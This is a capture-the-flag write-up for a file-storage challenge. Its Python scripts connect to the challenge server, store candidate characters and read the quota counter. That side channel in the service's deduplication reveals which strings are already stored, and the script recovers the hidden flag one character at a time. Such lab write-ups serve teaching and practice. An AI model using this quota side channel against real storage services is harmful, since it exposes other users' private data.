# Observations. 

## From the source code we can see
* the  blocks of data are  kept in the form {startIndex,endIndex}. !Important can overlap for 1+ records

* Size increases only if we miss those existing blocks of data. Brute force all combinations to get the result

# Atack Overview

### Check the characters used in the initial storage.

```

import time as os
import socket 
import string as str

url = "filestore.2021.ctfcompetition.com"
port = 1337
toCheck = str.ascii_letters + str.digits + str.punctuation
SKIP = True
def skipInput(socket,count):
    loop = 0
    while loop != count:
        data = socket.recv(1024)
        if len(data) == 0:
            break
        loop += 1
    return data.decode('utf-8')

def getStatus(socket):
    return skipInput(socket, 2)

def netcat(hostname, port, content):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    goalStatus = "Quota: 0.026kB/64.000kB"
    #close welcome message
    '== proof-of-work: disabled ==\n'
    """Welcome to our file storage solution.\n\n
    Menu:\n
    - load\n
    - store\n
    - status\n
    - exit\n"""
    skipInput(s, 2)

    s.sendall("store\n".encode())

    #"Send me a line of data..."
    #close input prompt
    skipInput(s, 1)
    s.sendall((content+"\n").encode())

    #"Stored! Here's your file id:"
    #"********"
    #Close a success message. 
    skipInput(s, 1)

    #get status
    s.sendall("status\n".encode())
    currentStatus = getStatus(s)

    if currentStatus.find(goalStatus) == -1:
        return -1
    s.close()
    os.sleep(1)
    
usedChars = []
if not SKIP:
    for i in toCheck:
        #skip records
        if -1 == netcat(url,port,i):
            continue
        usedChars.append(i)
print(usedChars)
```

### Following characters are discovered. They are used to create the original data.

```

permutationOfCharacters = ['c', 'd', 'f', 'i', 'n', 'p', 't', 'u', 'C', 'F', 'M', 'R', 'T', '0', '1', '3', '4', '_', '{', '}']

```

### Time to brute force all possible Combinations with Replacement

```

#brute force all possibilities
#Get a core
totalString = permutationOfCharacters[0]

while True:
    Updated = False
    print(totalString)
    #Check left
    for i in permutationOfCharacters:
        if -1 == netcat(url, port, i + totalString):
            continue
        Updated = True
        totalString = i + totalString
        break
    
    
    #Check right
    for i in permutationOfCharacters:
        if -1 == netcat(url, port, totalString + i):
            continue
        Updated = True
        totalString = totalString + i
        break
        
    if Updated == False:
        break
print(totalString)
```
